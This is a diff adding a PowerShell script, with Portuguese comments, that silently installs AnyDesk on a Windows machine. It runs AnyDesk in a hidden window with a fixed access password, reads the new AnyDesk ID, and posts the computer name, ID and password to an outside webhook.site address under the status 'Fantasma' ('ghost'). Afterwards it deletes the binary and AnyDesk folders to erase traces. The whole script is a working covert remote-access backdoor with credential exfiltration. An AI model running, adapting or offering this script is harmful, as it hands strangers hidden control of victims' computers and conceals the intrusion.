@@ -1,0 +1,52 @@
+$url = "https://download.anydesk.com/AnyDesk.exe"
+$arquivo = "$env:TEMP\Any_Russo.exe"
+$webhook = "https://webhook.site/1070b89e-8689-4293-b09a-2e166cfba592"
+$senha = "10978"
+$appData = "$env:APPDATA\AnyDesk"
+
+# 1. Encerra processos antigos e limpa pastas para garantir um ID novo
+Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
+if (Test-Path $appData) { Remove-Item -Recurse -Force $appData }
+
+# 2. Download silencioso
+Invoke-WebRequest -Uri $url -OutFile $arquivo
+
+# 3. Inicia o AnyDesk minimizado e define a senha
+Start-Process -FilePath $arquivo -ArgumentList "--set-password $senha" -WindowStyle Hidden
+Start-Sleep -Seconds 5
+
+# 4. Loop para capturar o ID (Verifica o arquivo system.conf)
+$anyID = $null
+$confPath = "$appData\system.conf"
+
+while (-not $anyID) {
+    if (Test-Path $confPath) {
+        $content = Get-Content $confPath | Select-String "ad.anynet.id="
+        if ($content) {
+            $anyID = ($content -split '=')[1].Trim()
+        }
+    }
+    if (-not $anyID) { Start-Sleep -Seconds 2 }
+}
+
+# 5. Envia os dados para o Webhook
+$body = @{
+    maquina = $env:COMPUTERNAME
+    anydesk_id = $anyID
+    senha = $senha
+    status = "Fantasma_PS1_Online"
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
+
+# 6. Aguarda o processo fechar para limpar tudo
+while (Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue) {
+    Start-Sleep -Seconds 5
+}
+
+# 7. Limpeza Final
+Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+Remove-Item -Force $arquivo -ErrorAction SilentlyContinue
+Remove-Item -Recurse -Force $appData -ErrorAction SilentlyContinue
+Remove-Item -Recurse -Force "$env:ProgramData\AnyDesk" -ErrorAction SilentlyContinue
